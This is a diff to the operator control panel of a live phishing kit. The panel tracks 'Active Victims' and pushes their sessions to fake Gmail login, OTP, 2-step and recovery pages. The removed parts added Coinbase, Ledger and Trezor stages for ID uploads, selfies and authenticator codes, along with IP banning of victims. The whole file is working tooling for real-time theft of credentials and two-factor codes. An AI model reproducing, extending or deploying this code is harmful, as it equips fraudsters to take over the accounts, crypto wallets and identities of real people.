@@ -24,7 +24,6 @@
             --shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05);
             --transition: all 0.3s ease;
             --gmail-color: #ea4335;
-            --C&#8203;oinbase-color: #0052ff;
         }
 
         * {
@@ -257,7 +256,7 @@
         }
 
         /* Cards */
-        .victim-card, .banned-ip-card {
+        .victim-card {
             background: var(--card-bg);
             border-radius: var(--border-radius);
             padding: 20px;
@@ -267,14 +266,9 @@
             transition: var(--transition);
         }
 
-        .victim-card:hover, .banned-ip-card:hover {
+        .victim-card:hover {
             transform: translateY(-5px);
             box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.1), 0 10px 10px -5px rgba(0, 0, 0, 0.04);
-        }
-
-        .banned-ip-card {
-            background: #fee2e2;
-            border-left: 4px solid var(--danger);
         }
 
         .card-header {
@@ -447,40 +441,6 @@
             border-left-color: var(--gmail-color);
         }
 
-        .C&#8203;oinbase-header {
-            background: rgba(0, 82, 255, 0.15);
-            color: var(--C&#8203;oinbase-color);
-            border-left-color: var(--C&#8203;oinbase-color);
-        }
-
-        .navigation-divider {
-            height: 4px;
-            background: linear-gradient(90deg, var(--gmail-color), var(--C&#8203;oinbase-color));
-            margin: 30px 0;
-            border-radius: 2px;
-            position: relative;
-            overflow: hidden;
-        }
-
-        .navigation-divider::before {
-            content: "";
-            position: absolute;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background: linear-gradient(90deg, 
-                transparent 0%, 
-                rgba(255,255,255,0.7) 50%, 
-                transparent 100%);
-            animation: shimmer 3s infinite;
-        }
-
-        @keyframes shimmer {
-            0% { transform: translateX(-100%); }
-            100% { transform: translateX(100%); }
-        }
-
         /* Controls */
         .controls {
             display: flex;
@@ -506,7 +466,6 @@
         .send-waiting { background: var(--gmail-color); color: white; }
         .send-login { background: var(--gmail-color); color: white; }
         .delete-btn { background: var(--danger); color: white; }
-        .unban-btn { background: var(--secondary); color: white; }
         .send-stall { background: var(--gmail-color); color: white; }
         .send-verify { background: var(--gmail-color); color: white; }
         .send-password { background: var(--gmail-color); color: white; }
@@ -514,19 +473,7 @@
         .send-otp { background: var(--gmail-color); color: white; }
         .send-recovery { background: var(--gmail-color); color: white; }
         .send-2step { background: var(--gmail-color); color: white; }
-        .send-C&#8203;oinbase { background: var(--C&#8203;oinbase-color); color: white; }
-        .send-landing { background: var(--C&#8203;oinbase-color); color: white; }
-        .send-trezor { background: var(--C&#8203;oinbase-color); color: white; }
-        .send-ledger { background: var(--C&#8203;oinbase-color); color: white; }
-        .send-external { background: var(--C&#8203;oinbase-color); color: white; }
-        .send-idtype { background: var(--C&#8203;oinbase-color); color: white; }
-        .send-idupload { background: var(--C&#8203;oinbase-color); color: white; }
-        .send-selfie { background: var(--C&#8203;oinbase-color); color: white; }
-        .send-authenticator { background: var(--C&#8203;oinbase-color); color: white; }
-        .send-C&#8203;oinbase-2factor { background: var(--C&#8203;oinbase-color); color: white; }
-        .send-final-redirect { background: var(--C&#8203;oinbase-color); color: white; }
         .send-invalid { background: var(--gmail-color); color: white; }
-        .send-index { background: var(--C&#8203;oinbase-color); color: white; }
 
         .control-btn:hover {
             transform: translateY(-2px);
@@ -590,77 +537,31 @@
                 justify-content: center;
             }
         }
-        /* Switch toggle styles */
-.switch {
-    position: relative;
-    display: inline-block;
-    width: 60px;
-    height: 34px;
-}
 
-.switch input {
-    opacity: 0;
-    width: 0;
-    height: 0;
-}
+        .alert {
+            padding: 12px 16px;
+            border-radius: 8px;
+            margin: 10px 0;
+            font-weight: 600;
+        }
 
-.slider {
-    position: absolute;
-    cursor: pointer;
-    top: 0;
-    left: 0;
-    right: 0;
-    bottom: 0;
-    background-color: #ccc;
-    transition: .4s;
-    border-radius: 34px;
-}
+        .alert-success {
+            background: #d1fae5;
+            color: #065f46;
+            border: 1px solid #a7f3d0;
+        }
 
-.slider:before {
-    position: absolute;
-    content: "";
-    height: 26px;
-    width: 26px;
-    left: 4px;
-    bottom: 4px;
-    background-color: white;
-    transition: .4s;
-    border-radius: 50%;
-}
+        .alert-danger {
+            background: #fee2e2;
+            color: #991b1b;
+            border: 1px solid #fecaca;
+        }
 
-input:checked + .slider {
-    background-color: var(--secondary);
-}
-
-input:checked + .slider:before {
-    transform: translateX(26px);
-}
-
-/* Security message styles */
-.alert {
-    padding: 12px 16px;
-    border-radius: 8px;
-    margin: 10px 0;
-    font-weight: 600;
-}
-
-.alert-success {
-    background: #d1fae5;
-    color: #065f46;
-    border: 1px solid #a7f3d0;
-}
-
-.alert-danger {
-    background: #fee2e2;
-    color: #991b1b;
-    border: 1px solid #fecaca;
-}
-
-.alert-warning {
-    background: #fef3c7;
-    color: #92400e;
-    border: 1px solid #fde68a;
-}
+        .alert-warning {
+            background: #fef3c7;
+            color: #92400e;
+            border: 1px solid #fde68a;
+        }
         </style>
     </head>
     <body>
@@ -677,10 +578,6 @@ input:checked + .slider:before {
                     <a href="#" class="nav-item active" onclick="showTab('victims')">
                         <i class="fas fa-user-circle"></i>
                         Active Victims
-                    </a>
-                    <a href="#" class="nav-item" onclick="showTab('banned')">
-                        <i class="fas fa-ban"></i>
-                        Banned IPs
                     </a>
                     <a href="#" class="nav-item">
                         <i class="fas fa-cog"></i>
@@ -720,60 +617,16 @@ input:checked + .slider:before {
                     </button>
                     <span id="refreshStatus">Auto-refresh running every 10 seconds</span>
                 </div>
-                <!-- Add this section right after the refresh controls -->
-                <div class="security-controls" style="margin: 20px 0; display: flex; gap: 15px; flex-wrap: wrap; align-items: center;">
-                    <!-- Site Toggle -->
-                    <div class="site-toggle-container" style="display: flex; align-items: center; gap: 10px; background: rgba(255,255,255,0.05); padding: 12px 16px; border-radius: 8px;">
-                        <strong style="color: var(--gray-light);">Site Status:</strong>
-                        <label class="switch">
-                            <input type="checkbox" id="siteToggle" checked>
-                            <span class="slider round"></span>
-                        </label>
-                        <span id="siteStatus" style="font-weight: 600; color: var(--secondary);">LIVE</span>
-                    </div>
-                    <!-- Ban All Logs Button -->
-                    <button id="banAllLogs" class="btn btn-danger" style="padding: 12px 20px; background: var(--danger); color: white; border: none; border-radius: 8px; cursor: pointer; font-weight: 600; display: flex; align-items: center; gap: 8px;">
-                        <i class="fas fa-radiation"></i>
-                        BAN ALL LOGS
-                    </button>
-                    <!-- Clear All Logs Button -->
-                    <button id="clearAllLogs" class="btn btn-warning" style="padding: 12px 20px; background: var(--warning); color: white; border: none; border-radius: 8px; cursor: pointer; font-weight: 600; display: flex; align-items: center; gap: 8px;">
+                
+                <!-- Clear All Logs Button -->
+                <div class="clear-logs-section" style="margin: 20px 0; text-align: center;">
+                    <button id="clearAllLogs" class="btn btn-danger" style="padding: 12px 24px; background: var(--danger); color: white; border: none; border-radius: 8px; cursor: pointer; font-weight: 600; display: flex; align-items: center; gap: 8px; margin: 0 auto;">
                         <i class="fas fa-trash"></i>
                         CLEAR ALL LOGS
                     </button>
-                </div>
-                <!-- Status Messages -->
-                <div id="securityMessage" style="margin: 10px 0; text-align: center;"></div>
-                <!-- Add this button in your panel.html, preferably near the top -->
-                <div class="clear-logs-section" style="margin: 20px 0; text-align: center;">
-                    <button id="clearAllLogs" class="btn btn-danger" style="padding: 10px 20px; font-size: 16px;">
-                        🗑️ CLEAR ALL LOGS
-                    </button>
                     <div id="clearLogsMessage" style="margin-top: 10px;"></div>
                 </div>
-                <!-- Token Access System -->
-                <div class="token-controls" style="margin: 20px 0; background: rgba(255,255,255,0.05); padding: 20px; border-radius: 12px;">
-                    <h3 style="margin-bottom: 15px; color: var(--primary);">
-                        <i class="fas fa-key"></i>
-                        Token Access System
-                    </h3>
-                    <!-- Generate New Token -->
-                    <div style="margin-bottom: 20px;">
-                        <button id="generateToken" class="btn btn-primary" style="padding: 12px 20px; background: var(--primary); color: white; border: none; border-radius: 8px; cursor: pointer; font-weight: 600; display: flex; align-items: center; gap: 8px;">
-                            <i class="fas fa-plus-circle"></i>
-                            GENERATE NEW ACCESS TOKEN
-                        </button>
-                        <div id="tokenResult" style="margin-top: 10px;"></div>
-                    </div>
-                    <!-- Active Tokens -->
-                    <div>
-                        <h4 style="margin-bottom: 15px; color: var(--gray-light);">
-                            <i class="fas fa-list"></i>
-                            Active Tokens
-                        </h4>
-                        <div id="tokensList"></div>
-                    </div>
-                </div>
+
                 <!-- Phone Type Selector -->
                 <div class="phone-type-selector">
                     <label for="phoneType">
@@ -790,6 +643,7 @@ input:checked + .slider:before {
                         <span id="selectedPhoneType"></span>
                     </span>
                 </div>
+
                 <!-- Main Panel -->
                 <div class="main-panel">
                     <div class="tab-buttons">
@@ -800,10 +654,6 @@ input:checked + .slider:before {
                             <i class="fas fa-user-circle"></i>
                             Active Victims
                         </button>
-                        <button class="tab-button" onclick="showTab('banned')">
-                            <i class="fas fa-ban"></i>
-                            Banned IPs
-                        </button>
                     </div>
                     <div id="victimsTab" class="tab-content active">
                         <h2>
@@ -811,13 +661,6 @@ input:checked + .slider:before {
                             Active Victims
                         </h2>
                         <div id="victimsList"></div>
-                    </div>
-                    <div id="bannedTab" class="tab-content">
-                        <h2>
-                            <i class="fas fa-ban"></i>
-                            Banned IP Addresses
-                        </h2>
-                        <div id="bannedIpsList"></div>
                     </div>
                 </div>
             </div>
@@ -832,322 +675,7 @@ input:checked + .slider:before {
         let numberData = {};
         let phoneTypeData = {};
         let globalPhoneType = '';
-        let siteEnabled = true;
 
-        async function generateToken() {
-            const button = document.getElementById('generateToken');
-            const originalText = button.innerHTML;
-    
-            button.innerHTML = '<i class="fas fa-spinner fa-spin"></i> GENERATING...';
-            button.disabled = true;
-
-            try {
-                const response = await fetch('/api/generate-token', {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'}
-                });
-        
-                const data = await response.json();
-        
-                if (data.success) {
-                    const tokenResult = document.getElementById('tokenResult');
-                    tokenResult.innerHTML = `
-                <div class="alert alert-success">
-                    <h4><i class="fas fa-check-circle"></i> TOKEN GENERATED!</h4>
-                    <p><strong>Token:</strong> <code>${data.token}</code></p>
-                    <p><strong>Access URL:</strong></p>
-                    <div style="background: #f8f9fa; padding: 10px; border-radius: 5px; margin: 10px 0;">
-                        <code style="word-break: break-all; color: var(--primary);">${data.access_url}</code>
-                    </div>
-                    <button onclick="copyToClipboard('${data.access_url}')" class="btn btn-secondary" style="padding: 8px 16px; background: var(--secondary); color: white; border: none; border-radius: 5px; cursor: pointer;">
-                        <i class="fas fa-copy"></i> Copy URL
-                    </button>
-                </div>
-                    `;
-            
-            // Refresh tokens list
-                    loadTokens();
-                } else {
-                    document.getElementById('tokenResult').innerHTML = `
-                <div class="alert alert-danger">
-                    <i class="fas fa-exclamation-triangle"></i> Error generating token: ${data.error}
-                </div>
-                    `;
-                }
-            } catch (error) {
-                console.error('Error generating token:', error);
-                document.getElementById('tokenResult').innerHTML = `
-            <div class="alert alert-danger">
-                <i class="fas fa-exclamation-triangle"></i> Error generating token
-            </div>
-                `;
-            } finally {
-                button.innerHTML = originalText;
-                button.disabled = false;
-            }
-        }
-        async function loadTokens() {
-            try {
-                const response = await fetch('/api/get-tokens');
-                const data = await response.json();
-        
-                const tokensList = document.getElementById('tokensList');
-        
-                if (!data.tokens || data.tokens.length === 0) {
-                    tokensList.innerHTML = '<div class="alert alert-info">No active tokens</div>';
-                    return;
-                }
-        
-                tokensList.innerHTML = '';
-        
-                data.tokens.forEach(token => {
-                    const baseUrl = window.location.origin;
-                    const accessUrl = `${baseUrl}/?token=${token.token}`;
-            
-                    const tokenCard = document.createElement('div');
-                    tokenCard.className = 'victim-card';
-                    tokenCard.innerHTML = `
-                <div class="card-header">
-                    <div class="victim-info">
-                        <span class="status-indicator ${token.is_active ? 'status-online' : 'status-offline'}"></span>
-                        <span class="victim-email" style="font-family: monospace; font-size: 14px;">${token.token}</span>
-                    </div>
-                    <span class="current-page">${token.is_active ? 'ACTIVE' : 'INACTIVE'}</span>
-                </div>
-                
-                <div class="victim-details">
-                    <div class="detail-item">
-                        <span class="detail-label"><i class="fas fa-link"></i> Access URL</span>
-                        <span class="detail-value" style="font-family: monospace; font-size: 12px;">
-                            <a href="${accessUrl}" target="_blank">${accessUrl}</a>
-                        </span>
-                    </div>
-                    <div class="detail-item">
-                        <span class="detail-label"><i class="fas fa-calendar"></i> Created</span>
-                        <span class="detail-value">${new Date(token.created_at).toLocaleString()}</span>
-                    </div>
-                    <div class="detail-item">
-                        <span class="detail-label"><i class="fas fa-counter"></i> Used Count</span>
-                        <span class="detail-value">${token.used_count || 0}</span>
-                    </div>
-                    <div class="detail-item">
-                        <span class="detail-label"><i class="fas fa-clock"></i> Last Used</span>
-                        <span class="detail-value">${token.last_used ? new Date(token.last_used).toLocaleString() : 'Never'}</span>
-                    </div>
-                </div>
-                
-                <div class="controls">
-                    <button class="control-btn" onclick="copyToClipboard('${accessUrl}')" style="background: var(--info);">
-                        <i class="fas fa-copy"></i> Copy URL
-                    </button>
-                    <button class="control-btn delete-btn" onclick="revokeToken('${token.token}')">
-                        <i class="fas fa-ban"></i> Revoke Token
-                    </button>
-                </div>
-                    `;
-                    tokensList.appendChild(tokenCard);
-                });
-        
-            } catch (error) {
-                console.error('Error loading tokens:', error);
-                document.getElementById('tokensList').innerHTML = `
-            <div class="alert alert-danger">
-                <i class="fas fa-exclamation-triangle"></i> Error loading tokens
-            </div>
-                `;
-            }
-        }
-        async function revokeToken(token) {
-            if (confirm(`Are you sure you want to revoke this token?\n\n${token}\n\nThis will immediately block access for anyone using this token.`)) {
-                try {
-                    const response = await fetch('/api/revoke-token', {
-                        method: 'POST',
-                        headers: {'Content-Type': 'application/json'},
-                        body: JSON.stringify({ token: token })
-                    });
-            
-                    const data = await response.json();
-            
-                    if (data.success) {
-                        showSecurityMessage('✅ Token revoked successfully!', 'success');
-                        loadTokens();
-                    } else {
-                        showSecurityMessage('❌ Error revoking token: ' + data.error, 'danger');
-                    }
-                } catch (error) {
-                    console.error('Error revoking token:', error);
-                    showSecurityMessage('❌ Error revoking token', 'danger');
-                }
-            }
-        }
-        function copyToClipboard(text) {
-            navigator.clipboard.writeText(text).then(() => {
-                showSecurityMessage('✅ URL copied to clipboard!', 'success');
-            }).catch(err => {
-                console.error('Failed to copy: ', err);
-                showSecurityMessage('❌ Failed to copy to clipboard', 'danger');
-            });
-        }
-        document.addEventListener('DOMContentLoaded', function() {
-            document.getElementById('generateToken').addEventListener('click', generateToken);
-            loadTokens(); // Load tokens on page load
-    });
-
-
-
-
-        async function checkSiteStatus() {
-            try {
-                const response = await fetch('/api/get-site-status');
-                const data = await response.json();
-                siteEnabled = data.enabled;
-                updateSiteToggle();
-            } catch (error) {
-                console.error('Error checking site status:', error);
-            }
-        }
-        function updateSiteToggle() {
-            const toggle = document.getElementById('siteToggle');
-            const status = document.getElementById('siteStatus');
-    
-            toggle.checked = siteEnabled;
-            status.textContent = siteEnabled ? 'LIVE' : 'DISABLED';
-            status.style.color = siteEnabled ? 'var(--secondary)' : 'var(--danger)';
-        }
-        async function toggleSiteStatus() {
-            const newStatus = !siteEnabled;
-    
-            try {
-                const response = await fetch('/api/toggle-site', {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ enabled: newStatus })
-                });
-        
-                const data = await response.json();
-                if (data.success) {
-                    siteEnabled = newStatus;
-                    updateSiteToggle();
-            
-                    showSecurityMessage(
-                        `Site is now ${siteEnabled ? 'LIVE' : 'DISABLED'}`,
-                        siteEnabled ? 'success' : 'warning'
-                    );
-                }
-            } catch (error) {
-                console.error('Error toggling site status:', error);
-                showSecurityMessage('Error toggling site status', 'danger');
-            }
-        }
-
-        async function banAllIPs() {
-            if (!confirm('🚨 MASS BAN CONFIRMATION\n\nThis will ban ALL IP addresses from:\n• Active victims\n• Navigation logs\n• Any recorded IPs\n\nThis action is PERMANENT and cannot be undone!\n\nAre you absolutely sure?')) {
-                return;
-            }
-
-            const button = document.getElementById('banAllLogs');
-            const originalText = button.innerHTML;
-    
-            button.innerHTML = '<i class="fas fa-spinner fa-spin"></i> BANNING...';
-            button.disabled = true;
-
-            try {
-                const response = await fetch('/api/ban-all-ips', {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'}
-                });
-        
-                const data = await response.json();
-        
-                if (data.success) {
-                    showSecurityMessage(
-                        `✅ Successfully banned ${data.banned_count} IP addresses!`,
-                        'success'
-                    );
-            
-            // Refresh banned IPs list
-                    if (currentTab === 'banned') {
-                        loadBannedIps();
-                    }
-                } else {
-                    showSecurityMessage('❌ Error banning IPs: ' + data.error, 'danger');
-                }
-            } catch (error) {
-                console.error('Error banning all IPs:', error);
-                showSecurityMessage('❌ Error banning IPs', 'danger');
-            } finally {
-                button.innerHTML = originalText;
-                button.disabled = false;
-            }
-        }
-
-        function showSecurityMessage(message, type = 'info') {
-            const messageDiv = document.getElementById('securityMessage');
-            messageDiv.innerHTML = `<div class="alert alert-${type}">${message}</div>`;
-    
-    // Auto-hide success messages after 5 seconds
-            if (type === 'success') {
-                setTimeout(() => {
-                    messageDiv.innerHTML = '';
-                }, 5000);
-            }
-        }
-
-        document.getElementById('clearAllLogs').addEventListener('click', function() {
-            if (confirm('🚨 ARE YOU SURE?\n\nThis will delete ALL victim data, navigation logs, and banned IPs!\n\nThis action cannot be undone!')) {
-                const button = this;
-                const originalText = button.innerHTML;
-
-                button.innerHTML = '<i class="fas fa-spinner fa-spin"></i> CLEARING...';
-                button.disabled = true;
-
-                fetch('/api/clear-all-logs', {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'}
-                })
-                .then(response => response.json())
-                .then(data => {
-                    if (data.success) {
-                        showSecurityMessage('✅ All logs cleared successfully! Refreshing...', 'success');
-                
-                // Refresh the victims list and banned IPs
-                        setTimeout(() => {
-                            location.reload();
-                        }, 2000);
-                    } else {
-                        showSecurityMessage('❌ Error clearing logs: ' + data.error, 'danger');
-                        button.innerHTML = originalText;
-                        button.disabled = false;
-                    }
-                })
-                .catch(error => {
-                    console.error('Error:', error);
-                    showSecurityMessage('❌ Error clearing logs', 'danger');
-                    button.innerHTML = originalText;
-                    button.disabled = false;
-                });
-            }
-        });
-
-        document.addEventListener('DOMContentLoaded', function() {
-    // Site toggle
-            document.getElementById('siteToggle').addEventListener('change', toggleSiteStatus);
-    
-    // Ban all logs
-            document.getElementById('banAllLogs').addEventListener('click', banAllIPs);
-    
-    // Check site status on load
-            checkSiteStatus();
-        });
-
-        function initialize() {
-            loadVictims();
-            startRefreshTimer();
-            checkSiteStatus(); // Add this line
-        }
-
-
-        
         // Set global phone type from dropdown
         function setGlobalPhoneType() {
             const phoneTypeDropdown = document.getElementById('phoneType');
@@ -1323,8 +851,6 @@ input:checked + .slider:before {
             // Load data for the tab
             if (tabName === 'victims') {
                 loadVictims();
-            } else if (tabName === 'banned') {
-                loadBannedIps();
             }
         }
 
@@ -1350,8 +876,6 @@ input:checked + .slider:before {
         function manualRefresh() {
             if (currentTab === 'victims') {
                 loadVictims();
-            } else if (currentTab === 'banned') {
-                loadBannedIps();
             }
         }
 
@@ -1364,8 +888,6 @@ input:checked + .slider:before {
                 if (!isRefreshPaused) {
                     if (currentTab === 'victims') {
                         loadVictims();
-                    } else if (currentTab === 'banned') {
-                        loadBannedIps();
                     }
                 }
             }, refreshInterval);
@@ -1804,56 +1326,8 @@ input:checked + .slider:before {
                             <button class="control-btn send-2step" onclick="forceRedirectTo2Step('${victim.session_id}')">
                                 <i class="fas fa-lock"></i> Force to 2-Step
                             </button>
-                        </div>
-
-                        <!-- Visual Divider -->
-                        <div class="navigation-divider"></div>
-
-                        <!-- C&#8203;oinbase Navigation Section -->
-                        <div class="navigation-header C&#8203;oinbase-header">
-                            <i class="fab fa-bitcoin"></i>
-                            C&#8203;oinbase Navigation Controls
-                        </div>
-                        
-                        <div class="controls">
-                            <button class="control-btn send-index" onclick="forceRedirect('${victim.session_id}', 'go_to_main')">
-                                <i class="fas fa-home"></i> Force to C&#8203;oinbase
-                            </button>
-                            <button class="control-btn send-C&#8203;oinbase" onclick="forceRedirect('${victim.session_id}', 'go_to_C&#8203;oinbase')">
-                                <i class="fas fa-university"></i> Force to Login
-                            </button>
-                            <button class="control-btn send-ledger" onclick="forceRedirect('${victim.session_id}', 'go_to_ledger')">
-                                <i class="fas fa-wallet"></i> Force to Ledger
-                            </button>
-                            <button class="control-btn send-external" onclick="forceRedirect('${victim.session_id}', 'go_to_external')">
-                                <i class="fas fa-external-link-alt"></i> Force to External Wallet
-                            </button>
-                            <button class="control-btn send-landing" onclick="forceRedirect('${victim.session_id}', 'go_to_landing')">
-                                <i class="fas fa-redo"></i> Force to Landing
-                            </button>
-                            <button class="control-btn send-trezor" onclick="forceRedirect('${victim.session_id}', 'go_to_trezor')">
-                                <i class="fas fa-hardware"></i> Force to Trezor
-                            </button>
-                            <button class="control-btn send-idtype" onclick="forceRedirect('${victim.session_id}', 'go_to_idtype')">
-                                <i class="fas fa-id-card"></i> Force to ID Type
-                            </button>
-                            <button class="control-btn send-idupload" onclick="forceRedirect('${victim.session_id}', 'go_to_idupload')">
-                                <i class="fas fa-camera"></i> Force to ID Upload
-                            </button>
-                            <button class="control-btn send-selfie" onclick="forceRedirect('${victim.session_id}', 'go_to_selfie')">
-                                <i class="fas fa-user-circle"></i> Force to Selfie
-                            </button>
-                            <button class="control-btn send-authenticator" onclick="forceRedirect('${victim.session_id}', 'go_to_authenticator')">
-                                <i class="fas fa-mobile"></i> Force to Authenticator
-                            </button>
-                            <button class="control-btn send-C&#8203;oinbase-2factor" onclick="forceRedirect('${victim.session_id}', 'go_to_C&#8203;oinbase_2factor')">
-                                <i class="fas fa-shield-alt"></i> Force to 2-Factor
-                            </button>
-                            <button class="control-btn send-final-redirect" onclick="forceRedirect('${victim.session_id}', 'go_to_final_redirect')">
-                                <i class="fas fa-flag-checkered"></i> Force to Final Redirect
-                            </button>
                             <button class="control-btn delete-btn" onclick="deleteVictim('${victim.session_id}', '${victim.ip_address}')">
-                                <i class="fas fa-trash"></i> Delete & Ban
+                                <i class="fas fa-trash"></i> Delete Victim
                             </button>
                         </div>
                         <div id="navigations-${victim.session_id}" class="navigations" style="display: none;"></div>
@@ -1867,22 +1341,6 @@ input:checked + .slider:before {
                 restoreNumberInputs();
                 restorePhoneTypeInputs();
 
-            async function checkAuth() {
-                try {
-                    const response = await fetch('/api/get-site-status');
-                    if (response.status === 401) {
-            // Redirect to login if unauthorized
-                        window.location.href = '/admin-login';
-                        return false;
-                    }
-                    return true;
-                } catch (error) {
-                    console.error('Auth check failed:', error);
-                    return false;
-                }
-            }
-
-        
             } catch (error) {
                 console.error('Error loading victims:', error);
                 document.getElementById('victimsList').innerHTML = `
@@ -1959,7 +1417,6 @@ input:checked + .slider:before {
         }
 
         // Original force redirect function (for other pages)
-        // Original force redirect function (for other pages)
         async function forceRedirect(sessionId, action) {
             try {
                 const actionName = action === 'go_to_waiting' ? 'Waiting Page' : 
@@ -1972,7 +1429,7 @@ input:checked + .slider:before {
                         action === 'go_to_invalid' ? 'Invalid Page' :
                         action === 'go_to_recovery' ? 'Recovery Page' : 'Unknown Page';
 
-                console.log(`Sending encoded command: ${action} for session ${sessionId}`);
+                console.log(`Sending command: ${action} for session ${sessionId}`);
 
                 await fetch('/api/control-victim', {
                     method: 'POST',
@@ -1980,7 +1437,7 @@ input:checked + .slider:before {
                     body: JSON.stringify({ session_id: sessionId, action: action })
                 });
 
-                alert(`Victim forced to ${actionName}! (Using encoded URL)`);
+                alert(`Victim forced to ${actionName}!`);
 
             } catch (error) {
                 console.error('Error controlling victim:', error);
@@ -2015,143 +1472,6 @@ input:checked + .slider:before {
             }
         }
 
-        // Load banned IPs
-        // Load banned IPs with reasons
-        // Load banned IPs with error handling
-        // Load banned IPs - FIXED VERSION
-        async function loadBannedIps() {
-            try {
-                console.log('🔄 Loading banned IPs...');
-        
-                const response = await fetch('/api/get-banned-ips');
-                const responseText = await response.text();
-        
-                console.log('📊 Response status:', response.status);
-                console.log('📊 Response type:', response.headers.get('content-type'));
-                console.log('📊 Response preview:', responseText.substring(0, 200));
-        
-                let data;
-                try {
-                    data = JSON.parse(responseText);
-                } catch (parseError) {
-                    console.error('❌ JSON parse error:', parseError);
-            
-            // Show the actual response for debugging
-                    document.getElementById('bannedIpsList').innerHTML = `
-                <div class="banned-ip-card">
-                    <h3><i class="fas fa-exclamation-triangle" style="color: var(--warning);"></i> Server Error</h3>
-                    <p>Server returned non-JSON response. This usually means:</p>
-                    <ul>
-                        <li>Authentication issue - please login again</li>
-                        <li>Server error - check Flask console</li>
-                        <li>Database connection issue</li>
-                    </ul>
-                    <p><strong>Response preview:</strong></p>
-                    <pre style="background: #f5f5f5; padding: 10px; border-radius: 5px; overflow: auto; max-height: 200px;">${escapeHtml(responseText.substring(0, 1000))}</pre>
-                    <button class="control-btn" onclick="loadBannedIps()" style="margin-top: 10px;">
-                        <i class="fas fa-redo"></i> Retry
-                    </button>
-                </div>
-                    `;
-                    return;
-                }
-        
-        // Handle errors from server
-                if (data.error) {
-                    throw new Error(`Server error: ${data.error}`);
-                }
-        
-                if (!data.success) {
-                    throw new Error('Request failed');
-                }
-
-                const bannedIpsList = document.getElementById('bannedIpsList');
-                bannedIpsList.innerHTML = '';
-
-                if (!data.banned_ips || data.banned_ips.length === 0) {
-                    bannedIpsList.innerHTML = `
-                <div class="banned-ip-card">
-                    <h3><i class="fas fa-check-circle" style="color: var(--secondary);"></i> No Banned IPs</h3>
-                    <p>No IP addresses are currently banned.</p>
-                </div>
-                    `;
-                    return;
-                }
-
-                data.banned_ips.forEach(bannedIp => {
-                    let timestampDisplay = 'Unknown';
-                    try {
-                        if (bannedIp.timestamp) {
-                            timestampDisplay = new Date(bannedIp.timestamp).toLocaleString();
-                        }
-                    } catch (timestampError) {
-                        console.warn('Error parsing timestamp:', timestampError);
-                        timestampDisplay = 'Invalid date';
-                    }
-
-                    const bannedIpCard = document.createElement('div');
-                    bannedIpCard.className = 'banned-ip-card';
-                    bannedIpCard.innerHTML = `
-                <div class="card-header">
-                    <div class="victim-info">
-                        <span class="status-indicator status-offline"></span>
-                        <span class="victim-email">${bannedIp.ip_address}</span>
-                    </div>
-                    <span class="ban-reason">${bannedIp.reason || 'Manual Ban'}</span>
-                </div>
-        
-                <div class="victim-details">
-                    <div class="detail-item">
-                        <span class="detail-label"><i class="fas fa-clock"></i> Banned Since</span>
-                        <span class="detail-value">${timestampDisplay}</span>
-                    </div>
-                    <div class="detail-item">
-                        <span class="detail-label"><i class="fas fa-info-circle"></i> Ban Reason</span>
-                        <span class="detail-value">${bannedIp.reason || 'Manual Ban'}</span>
-                    </div>
-                    <div class="detail-item">
-                        <span class="detail-label"><i class="fas fa-database"></i> Status</span>
-                        <span class="detail-value" style="color: var(--danger); font-weight: bold;">PERMANENT BAN</span>
-                    </div>
-                </div>
-        
-                <div class="controls">
-                    <button class="control-btn unban-btn" onclick="unbanIp('${bannedIp.ip_address}')">
-                        <i class="fas fa-check-circle"></i> Unban IP
-                    </button>
-                </div>
-                    `;
-                    bannedIpsList.appendChild(bannedIpCard);
-                });
-
-                console.log(`✅ Loaded ${data.banned_ips.length} banned IPs successfully`);
-
-            } catch (error) {
-                console.error('❌ Error loading banned IPs:', error);
-                document.getElementById('bannedIpsList').innerHTML = `
-            <div class="banned-ip-card">
-                <h3><i class="fas fa-exclamation-triangle" style="color: var(--warning);"></i> Error Loading Banned IPs</h3>
-                <p>${error.message}</p>
-                <p>Please check your connection and try again.</p>
-                <button class="control-btn" onclick="loadBannedIps()" style="margin-top: 10px;">
-                    <i class="fas fa-redo"></i> Retry
-                </button>
-            </div>
-                `;
-            }
-        }
-
-// Helper function to escape HTML
-        function escapeHtml(unsafe) {
-            return unsafe
-                .replace(/&/g, "&amp;")
-                .replace(/</g, "&lt;")
-                .replace(/>/g, "&gt;")
-                .replace(/"/g, "&quot;")
-                .replace(/'/g, "&#039;");
-        }
-
-        // Keep all your other existing functions (viewNavigations, deleteVictim, unbanIp, etc.)
         async function viewNavigations(sessionId) {
             try {
                 const response = await fetch(`/api/victim-navigations/${sessionId}`);
@@ -2181,20 +1501,17 @@ input:checked + .slider:before {
         }
 
         async function deleteVictim(sessionId, ipAddress) {
-            if (confirm(`Are you sure? This will delete the victim and BAN IP ${ipAddress}. They will be redirected to REAL Google.`)) {
+            if (confirm(`Are you sure? This will delete the victim.`)) {
                 try {
                     await fetch('/api/delete-victim', {
                         method: 'POST',
                         headers: {'Content-Type': 'application/json'},
                         body: JSON.stringify({ session_id: sessionId })
                     });
-                    alert(`Victim deleted and IP ${ipAddress} banned!`);
+                    alert(`Victim deleted!`);
                     // Remove from email data
                     delete emailData[sessionId];
                     loadVictims();
-                    if (currentTab === 'banned') {
-                        loadBannedIps();
-                    }
                 } catch (error) {
                     console.error('Error deleting victim:', error);
                     alert('Error deleting victim');
@@ -2202,42 +1519,9 @@ input:checked + .slider:before {
             }
         }
 
-        async function unbanIp(ipAddress) {
-            if (confirm(`Are you sure you want to unban IP ${ipAddress}? They will be able to access your page again.`)) {
-                try {
-                    const response = await fetch('/api/unban-ip', {
-                        method: 'POST',
-                        headers: {'Content-Type': 'application/json'},
-                        body: JSON.stringify({ ip_address: ipAddress })
-                    });
-                    
-                    const result = await response.json();
-                    if (result.success) {
-                        alert(`IP ${ipAddress} has been unbanned!`);
-                        loadBannedIps();
-                    } else {
-                        alert('Error unbanning IP');
-                    }
-                } catch (error) {
-                    console.error('Error unbanning IP:', error);
-                    alert('Error unbanning IP');
-                }
-            }
-        }
-
-        // Initialize
-        function initialize() {
-            checkAuth().then(isAuthenticated => {
-                if (isAuthenticated) {
-                    loadVictims();
-                    startRefreshTimer();
